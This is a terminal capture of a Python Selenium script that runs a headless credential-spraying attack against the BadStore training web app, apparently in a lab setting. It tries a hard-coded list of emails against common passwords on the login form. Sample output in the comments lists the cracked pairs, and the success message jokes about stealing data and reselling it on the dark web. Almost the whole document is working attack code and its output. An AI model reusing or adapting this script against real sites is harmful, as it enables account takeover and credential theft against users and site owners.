[centos@ip-10-0-1-234 partnerlab]$ cat headless-badstore-cred-spray.py
#!/usr/bin/python
# usage:
#
#ec2-user@kali:~$ python headless-badstore-cred-spray.py http://badstore-origin.cudathon.com/cgi-bin/badstore.cgi?action=loginregister
#Ah ... badstore ... good, good
#big@spender.com iforgot nope
#big@spender.com time nope
#big@spender.com love nope
#big@spender.com hello123 nope
#Jackpot! Will re-sell on dark web: big@spender.com money
#big@spender.com please nope
#itsbrett@gmail.com iforgot nope
#itsbrett@gmail.com time nope
#itsbrett@gmail.com love nope
#itsbrett@gmail.com hello123 nope
#itsbrett@gmail.com money nope
#itsbrett@gmail.com please nope
#Jackpot! Will re-sell on dark web: joe@supplier.com iforgot
#joe@supplier.com time nope
#joe@supplier.com love nope
#joe@supplier.com hello123 nope
#joe@supplier.com money nope
#joe@supplier.com please nope
#julio.tan@gmail.com iforgot nope
#julio.tan@gmail.com time nope
#julio.tan@gmail.com love nope
#julio.tan@gmail.com hello123 nope
#julio.tan@gmail.com money nope
#julio.tan@gmail.com please nope
#2@2.com iforgot nope
#2@2.com time nope
#2@2.com love nope
#2@2.com hello123 nope
#2@2.com money nope
#2@2.com please nope
#ec2-user@kali:~$
#
#
import os
import json
import sys
import time
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities

target = sys.argv[1]
target = target.lower()
print target
if (target.find('badstore') != -1 ):
        print ("Ah ... badstore ... good, good")
else:
        print ("Yikes, I don't see badstore in the target url, this thing is built specifcally for badstore so.... good luck!")

# enable browser logging
d = DesiredCapabilities.CHROME
d['loggingPrefs'] = { 'performance':'ALL' }
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
# import Action chains
from selenium.webdriver import ActionChains

#chrome_options = Options()
#chrome_options.add_argument("--headless")
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--remote-debugging-port=9222")
chrome_options.add_argument('--no-sandbox')

driver = webdriver.Chrome('/usr/bin/chromedriver', chrome_options=chrome_options, service_args=["--verbose", "--log-path=D:\\temp3\\chromedriverxx.log"], desired_capabilities=d)
email_list = ["big@spender.com", "itsbrett@gmail.com", "joe@supplier.com", "julio.tan@gmail.com", "2@2.com"]
passwd_list =["money", "time", "love", "hello123", "iforgot", "please"]
for email in email_list:
        for passwd in passwd_list:
                driver.get(target)
                time.sleep(0.25)
                #print(driver.page_source)
                assert "BadStore" in driver.title
                #assert "Python" in driver.title
                # elem = driver.find_element_by_partial_link_text('loginregister')
                #to refresh the browser
                #driver.refresh()
                # identifying the source element
                #source= driver.find_element_by_xpath("//*[text()='username']");
                # action chain object creation
                action = ActionChains(driver)
                # move to the element and click then perform the operation
                #action.move_to_element(elem).click().perform()
                elem = driver.find_element_by_name("email")
                elem.clear()
                elem.send_keys(email)
                elem = driver.find_element_by_name("passwd")
                elem.clear()
                elem.send_keys(passwd)
                sys.stdout.write("Trying credential combo " + email + " / " + passwd + " ...")
                elem.send_keys(Keys.RETURN)
                ## Give time for iframe to load ##
                time.sleep(3)
                ## You have to switch to the iframe like so: ##
                driver.switch_to.frame(driver.find_element_by_tag_name("iframe"))
                iframe = driver.page_source
                ### Insert text via xpath ##
                #elem = driver.find_element_by_xpath("/html/body/p")
                #elem.send_keys("Lorem Ipsum")
                ## Switch back to the "default content" (that is, out of the iframes) ##
                driver.switch_to.default_content()
                driver.delete_cookie("SSOid")
                #print(iframe)
                #assert "UserID and Password not found" not in driver.page_source
                if ("Unregistered" in iframe):
                        print "nope"
                else:
                        print "Jackpot! Will use to steal data here, and re-sell on dark web"
[centos@ip-10-0-1-234 partnerlab]$
